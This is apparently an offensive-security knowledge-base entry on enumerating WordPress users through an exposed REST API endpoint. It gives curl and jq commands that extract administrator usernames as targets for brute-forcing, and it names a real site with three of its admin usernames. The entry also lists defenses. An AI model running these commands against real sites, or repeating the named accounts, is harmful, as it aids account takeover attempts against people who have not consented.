---
tags:
  - wordpress
  - api
  - information-disclosure
  - user-enumeration
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-access-wp-rest-api]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Account Discovery]]'
skill_level: beginner
impact_level: high
detection_risk: low
sub_techniques: []
id: 1b7c4416-5f5e-4487-8ce9-123cc6fe0756
created_at: '2025-12-14T17:30:27.215Z'
updated_at: '2025-12-14T17:30:27.215Z'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Enumerate-WordPress-Users-via-Exposed-REST-API

## Summary

This procedure exploits a misconfigured WordPress REST API endpoint to enumerate all users on the site, including admin usernames, without authentication. It is commonly used in reconnaissance to gather targets for brute-force attacks on the WordPress admin panel.

## Description

WordPress installations often leave the default REST API enabled and unrestricted, allowing unauthenticated access to the /wp-json/wp/v2/users endpoint. This discloses sensitive information such as usernames (slugs), display names, and roles, enabling attackers to identify admin accounts for further exploitation. In the reported case on affiliates.udemy.com, direct access revealed admins like 'hamza', 'imanrana', and 'nupoora'. Prerequisites include public accessibility of the target site; no credentials or special tools are needed beyond HTTP requests.

## Requirements

1. Network access to the target WordPress site over HTTP/HTTPS
2. Basic knowledge of JSON parsing to extract usernames from the response
3. No authentication or prior access required

## Defense

Defensive measures and detection strategies:

- Disable or restrict the REST API users endpoint using plugins like Disable REST API or by adding authentication checks in functions.php
- Monitor access logs for repeated requests to /wp-json/wp/v2/users from suspicious IPs
- Implement rate limiting on API endpoints to prevent enumeration abuse

## Objectives

1. Retrieve a complete list of site users, focusing on admins
2. Extract usernames for use in password brute-forcing
3. Assess the site's security posture regarding API exposure

## Instructions

### Step 1: Access the REST API Endpoint

**Context**: Send an unauthenticated GET request to the users endpoint to fetch the JSON user list.

**Command** ([[commands/curl-access-wp-rest-api]]):
```bash
curl -s http://target-site.com/wp-json/wp/v2/users
```

> This command silently (-s) retrieves the JSON response. Successful output is an array of user objects, e.g., {"id":1,"slug":"hamza","roles":["administrator"]}, confirming exposure. If restricted, expect a 401 error.

### Step 2: Parse and Identify Admin Users

**Context**: Review the JSON for admin indicators like 'administrator' in roles or privileged slugs.

**Command** (Manual or jq for parsing):
```bash
curl -s http://target-site.com/wp-json/wp/v2/users | jq '.[] | select(.roles[] == "administrator") | .slug'
```

> Use jq (if available) to filter admins. Expected output: usernames like 'hamza'. Manually inspect in a browser or editor if no jq.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-access-wp-rest-api]]

## Tools Used


## Tags

- wordpress
- api
- information-disclosure
- user-enumeration
